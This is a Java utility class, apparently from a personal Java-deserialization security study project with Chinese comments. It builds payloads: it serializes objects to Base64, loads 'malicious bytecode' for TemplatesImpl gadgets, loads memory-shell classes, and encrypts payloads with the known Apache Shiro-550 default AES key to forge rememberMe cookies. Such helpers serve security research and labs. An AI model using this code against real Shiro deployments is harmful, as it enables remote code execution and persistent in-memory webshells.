import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.util.ByteSource;
import sun.misc.ProxyGenerator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class Util {
    static public void setValue(Object obj, String f, Object v) throws Exception{
        Field field = obj.getClass().getDeclaredField(f);
        field.setAccessible(true);
        field.set(obj, v);
    }

    /*
        将对象序列化
    */
    static public byte[] toSerial(Object obj) throws Exception{
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(byteArrayOutputStream);
        out.writeObject(obj);
        out.flush();
        out.close();
        return byteArrayOutputStream.toByteArray();
    }

    /*
        从序列化数据转换为对象
    */
    static public ObjectInputStream fromSerial(byte[] bytes) throws Exception{
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream in = new ObjectInputStream(byteArrayInputStream);
        return in;
    }

    static public void toSerialStr(Object obj) throws Exception{
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(byteArrayOutputStream);
        out.writeObject(obj);
        out.flush();
        out.close();
        System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));
    }

    /*
     参数：
         map：动态代理产生的对象
         filePath: 动态代理类字节码保存的class文件路径
    */
    static public void putProxyClassFile(Object map, String filePath) throws Exception{
        byte[] proxy0s = ProxyGenerator.generateProxyClass("$Proxy0", map.getClass().getInterfaces());
        FileOutputStream fileOutputStream = new FileOutputStream(filePath);
        fileOutputStream.write(proxy0s);
        fileOutputStream.close();
    }

    static public Object getObjectFieldValue(Object obj, String FieldName) throws Exception{
        Field field = obj.getClass().getDeclaredField(FieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    /*
       Base64编码并输出
    */
    static public String b64encode(byte[] bytes) {
        byte[] b64Byte = Base64.getEncoder().encode(bytes);
        return new String(b64Byte);
    }

    /*
        获取恶意字节码，将其bytes传递给TemplatesImpl的_bytecodes属性。
    */
    static public byte[] getExpClassFileBytes(String EvilClassFileName) throws Exception{
        File file = new File("C:\\Users\\Administrator\\Desktop\\Code\\java sec\\java-sec\\out\\production\\commons-collections\\"+EvilClassFileName+".class");
        byte[] bytes = new byte[(int) file.length()];
        FileInputStream fileInputStream = new FileInputStream(file);
        fileInputStream.read(bytes);
        fileInputStream.close();
        return bytes;
    }

    static public void shiro550Encrypt(byte[] plan){
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        CipherService aes = new AesCipherService();
        ByteSource byteSource = aes.encrypt(plan, key);
        System.out.println(byteSource.toBase64());
    }

    static public void writeSerialToFile(Object obj) throws Exception{
        File file = new File("C:\\Users\\Administrator\\Desktop\\Code\\java sec\\resource\\zkar_1.3.0_Windows_x86_64\\ser.txt");
        FileOutputStream fileOutputStream = new FileOutputStream(file);
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
        outputStream.writeObject(obj);
        outputStream.close();
        fileOutputStream.close();
    }

    static public byte[][] getMemoryShellBytes(String ClassName) throws Exception{
        File file = new File("C:\\Users\\Administrator\\Desktop\\Code\\java sec\\myserial\\out\\production\\memory-shell\\"+ClassName+".class");
        byte[] bytes = new byte[(int) file.length()];
        FileInputStream fileInputStream = new FileInputStream(file);
        fileInputStream.read(bytes);
        fileInputStream.close();
        return new byte[][]{bytes};
    }
}
